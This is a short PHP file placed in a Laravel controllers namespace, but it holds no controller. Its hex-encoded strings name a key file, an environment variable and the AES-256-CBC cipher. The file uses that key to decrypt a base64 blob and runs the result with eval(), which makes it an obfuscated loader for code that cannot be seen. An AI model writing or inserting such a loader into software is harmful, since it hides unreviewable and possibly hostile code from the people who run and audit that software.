<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('lhH09xc2hw7CL68VwtYM/Q==');

$c=base64_decode(

'9ISnljN3GGtlTTGOavlpAc8hLGiS5DNEx82PXUSCI8m/MNUrI/4I5Io/+bV/b5g1HTZIkPyCtLp8' .
'pEaU/VKpYEsrka+rF1eM46kqlW+mDF7AkvDVbgdFK02dsEXx5gVMvF7QiNIyrYCks6YlKyLZxItM' .
'DUNNwxzYcQ33DywNke+sHsYWjIT2WIDrFgBlLPkcxx0CIIc/DIbm0rEBbER8ADawlNIaOY0jzAMc' .
'NMnn06bSYg+0wzeNjMvIs54T7Z1m'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

